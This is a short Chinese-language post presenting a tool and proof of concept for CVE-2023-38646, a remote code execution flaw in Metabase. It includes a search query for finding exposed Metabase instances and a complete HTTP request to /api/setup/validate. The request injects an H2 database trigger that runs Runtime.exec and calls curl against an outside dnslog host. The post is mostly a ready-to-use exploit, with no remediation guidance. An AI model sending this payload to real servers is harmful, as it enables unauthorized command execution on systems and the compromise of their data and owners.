# 0x01 工具介绍

CVE-2023-38646漏洞是一种高危的Metabase远程代码执行漏洞。Metabase是一个开源的数据分析和可视化工具，可以帮助用户连接到各种数据源，并进行数据查询、分析和可视化。



# 工具链接

`https://github.com/robotmikhro/CVE-2023-38646`





**漏洞描述**

Metabase是一个开源的数据分析和可视化工具，它可以帮助用户轻松连接到各种数据源，包括数据库、云服务和API，然后使用绘图的界面进行数据查询、分析和可视化。需身份认证的远程攻击者利用该漏洞可以在服务器上以运行元数据库服务器的权限执行任意命令

**漏洞影响**

元数据库  

**网络测绘**

应用程序=“元数据库”  

**漏洞复现**

登录页面

![image-20230815141819803](./Metabase远程代码执行漏洞.assets/image-20230815141819803.png)

POC

/api/session/properties

![image-20230815141836777](./Metabase远程代码执行漏洞.assets/image-20230815141836777.png)

```
POST /api/setup/validate HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 812

{
    "token": "e56e2c0f-71bf-4e15-9879-d964f319be69",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl ecw14d.dnslog.cn')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

![image-20230815141848432](./Metabase远程代码执行漏洞.assets/image-20230815141848432.png)
